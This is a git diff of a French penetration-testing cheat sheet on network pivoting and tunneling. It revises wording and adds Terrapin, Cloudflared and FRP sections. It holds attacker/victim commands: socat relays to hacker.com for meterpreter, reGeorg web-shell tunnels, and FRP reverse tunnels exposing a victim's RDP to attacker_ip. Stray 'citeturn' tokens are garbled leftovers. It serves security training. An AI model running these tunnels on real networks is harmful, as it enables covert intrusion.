@@ -87,9 +87,13 @@ Définir une nouvelle route du côté client
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Sécurité – Attaque Terrapin (CVE-2023-48795)**
+> L'attaque de rétrogradation Terrapin de 2023 peut permettre à un homme du milieu de manipuler la première poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH. citeturn4search0
+
 ## SSHUTTLE
 
-Vous pouvez **tunneler** tout le **trafic** vers un **sous-réseau** via **ssh** à travers un hôte.\
+Vous pouvez **tunneler** via **ssh** tout le **trafic** vers un **sous-réseau** à travers un hôte.\
 Par exemple, transférer tout le trafic allant vers 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -159,7 +163,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 > [!WARNING]
-> Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
+> Dans ce cas, le **port est ouvert sur l'hôte beacon**, pas sur le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -168,7 +172,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Vous devez télécharger un tunnel de fichier web : ashx|aspx|js|jsp|php|php|jsp
+Vous devez télécharger un fichier web tunnel : ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -246,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivot through **proxy NTLM**
+Pivoter à travers **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -286,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
+Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime :
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -346,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Vous devez avoir **un accès RDP sur le système**.\
 Téléchargez :
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité Remote Desktop Service de Windows. DVC est responsable de **l'acheminement des paquets sur la connexion RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Cet outil utilise `Dynamic Virtual Channels` (`DVC`) de la fonctionnalité de Service de Bureau à Distance de Windows. DVC est responsable de **l'acheminement des paquets sur la connexion RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
@@ -354,7 +358,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** indiquant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -364,13 +368,13 @@ Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est à l'é
 ```
 netstat -antb | findstr 1080
 ```
-Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxyfier le trafic à travers ce port.**
+Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxy le trafic à travers ce port.**
 
-## Proxyfier les applications GUI Windows
+## Proxifier les applications GUI Windows
 
-Vous pouvez faire en sorte que les applications GUI Windows naviguent à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
+Vous pouvez faire naviguer les applications GUI Windows à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
 Dans **Profile -> Proxy Servers**, ajoutez l'IP et le port du serveur SOCKS.\
-Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxyfier et les connexions aux IP que vous souhaitez proxyfier.
+Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier et les connexions aux IP que vous souhaitez proxifier.
 
 ## Contournement du proxy NTLM
 
@@ -480,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
-_Exposition URI sont comme:_ **UID.ngrok.io**
+_Les URI d'exposition sont comme :_ **UID.ngrok.io**
 
 ### Installation
 
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **des services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrantes, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
+
+### Quick tunnel one-liner
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### Pivot SOCKS5
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Tunnels persistants avec DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Démarrez le connecteur :
+```bash
+cloudflared tunnel run mytunnel
+```
+Parce que tout le trafic quitte l'hôte **sortant sur 443**, les tunnels Cloudflared sont un moyen simple de contourner les ACL d'entrée ou les limites NAT. Soyez conscient que le binaire s'exécute généralement avec des privilèges élevés – utilisez des conteneurs ou le drapeau `--user` lorsque cela est possible. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) est un reverse-proxy Go activement maintenu qui prend en charge **TCP, UDP, HTTP/S, SOCKS et le P2P NAT-hole-punching**. À partir de **v0.53.0 (mai 2024)**, il peut agir comme une **passerelle de tunnel SSH**, permettant à un hôte cible de créer un tunnel inverse en utilisant uniquement le client OpenSSH standard – aucun binaire supplémentaire requis.
+
+### Tunnel TCP inverse classique
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Utilisation du nouveau passerelle SSH (sans binaire frpc)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+La commande ci-dessus publie le port de la victime **8080** en tant que **attacker_ip:9000** sans déployer d'outils supplémentaires – idéal pour le pivotement en vivant sur le terrain. citeturn2search1
+
 ## Autres outils à vérifier
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
